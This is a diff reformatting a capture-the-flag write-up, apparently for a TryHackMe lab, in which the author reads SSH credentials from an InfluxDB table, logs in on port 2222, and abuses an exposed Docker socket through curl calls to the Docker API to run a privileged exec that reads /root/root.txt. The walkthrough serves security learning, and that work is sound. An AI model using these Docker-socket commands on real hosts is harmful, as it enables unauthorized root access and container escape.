@@ -112,7 +112,7 @@ Access, and Covering Tracks.
 
     ``` select * from ssh ```
 
-6. Upon querying the creds database using the select * from ssh, I found this value under the name of "ssh": username: uzJk6Ry98d8C | password: REDACTED
+6. Upon querying the creds database using the ``` select * from ssh ```, I found this value under the name of "ssh": username: uzJk6Ry98d8C | password: REDACTED
 
 7. SSH into the machine with -p 2222 for the port and enter the above user and password. Usually, ssh runs on port 22, but it is common practice to assign ssh to another port in an attempt to obfuscate the service. In our terminal we would use this command to connect to the ssh port with the credentials: ``` ssh uzJk6Ry98d8C@10.10.136.240 -p 2222 ``` After executing the command it will ask us for the user's password. 
 
@@ -165,33 +165,34 @@ privileges and escape out of the container.
 
 4. Using curl we can list all images by issuing this command: ```  curl -i -s -X GET http://<docker_host>:PORT/containers/json  ```
 
-Which gives us this result:
+    Which gives us this result:
 
- ```bash
- ["Id":"3aca3900a312d70b576f0a86856612f8312ad03df5ae14dacb54439b52eafd31","Names":["/sweettoothinc"],"Image":"sweettoothinc:latest","ImageID":"sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e","Command":"/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''","Created":1627359591,"Ports":[{"IP":"0.0.0.0","PrivatePort":22,"PublicPort":2222,"Type":"tcp"},{"IP":"0.0.0.0","PrivatePort":8086,"PublicPort":8086,"Type":"tcp"}],"Labels":{},"State":"running","Status":"Up About an hour","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"d941570cec4dfc6c39532d4d875bcbdee64a3831e147c75b6167c481bcaf7d67","EndpointID":"bb07c60829d249c61aae7da7dba8fbe3a7738af7a7297d53a26f02787a8240ef","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[{"Type":"volume","Name":"80ed8feaaed22a73f8debc5905c2af290e39c5e8cd997047bdab5b0b61c67493","Source":"","Destination":"/var/lib/influxdb","Driver":"local","Mode":"","RW":true,"Propagation":""},{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"}]}]
+    ```bash
+    ["Id":"3aca3900a312d70b576f0a86856612f8312ad03df5ae14dacb54439b52eafd31","Names":          ["/sweettoothinc"],"Image":"sweettoothinc:latest","ImageID":"sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e","Command":"/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''","Created":1627359591,"Ports":[{"IP":"0.0.0.0","PrivatePort":22,"PublicPort":2222,"Type":"tcp"},{"IP":"0.0.0.0","PrivatePort":8086,"PublicPort":8086,"Type":"tcp"}],"Labels":{},"State":"running","Status":"Up About an hour","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"d941570cec4dfc6c39532d4d875bcbdee64a3831e147c75b6167c481bcaf7d67","EndpointID":"bb07c60829d249c61aae7da7dba8fbe3a7738af7a7297d53a26f02787a8240ef","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[{"Type":"volume","Name":"80ed8feaaed22a73f8debc5905c2af290e39c5e8cd997047bdab5b0b61c67493","Source":"","Destination":"/var/lib/influxdb","Driver":"local","Mode":"","RW":true,"Propagation":""},{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"}]}]
+
  
- ```
+    ```
 
 5. Next we run another curl command to the docker.sock dameon using exec which executes our command to cat open the first root.txt, you need the id from the command above:
 
-```bash
+    ```bash
 
-curl -i -s -X POST \
- -H "Content-Type: application/json" \
- --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/root/root.txt"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
-http://localhost:8080/containers/3aca3900a312d70b576f0a86856612f8312ad03df5ae14dacb54439b52eafd31/exec
+   curl -i -s -X POST \
+   -H "Content-Type: application/json" \
+   --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/root/root.txt"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
+   http://localhost:8080/containers/3aca3900a312d70b576f0a86856612f8312ad03df5ae14dacb54439b52eafd31/exec
 
-```
+    ```
 
 6. Now we need to start the container we just ran above which will give us the first root flag:
 
-```bash
+    ```bash
 
-curl -i -s -X POST \
- -H 'Content-Type: application/json' \
---data-binary '{"Detach": false,"Tty": false}' \ http://localhost:8080/exec/bfa14df9e363d42620d44d3234314c8997569be6555097ca59a4930e11053719/start
+   curl -i -s -X POST \
+   -H 'Content-Type: application/json' \
+   --data-binary '{"Detach": false,"Tty": false}' \ http://localhost:8080/exec/bfa14df9e363d42620d44d3234314c8997569be6555097ca59a4930e11053719/start
 
-```
+    ```
 
 After running this command we get the first root.txt flag: THM{REDACTED}
 
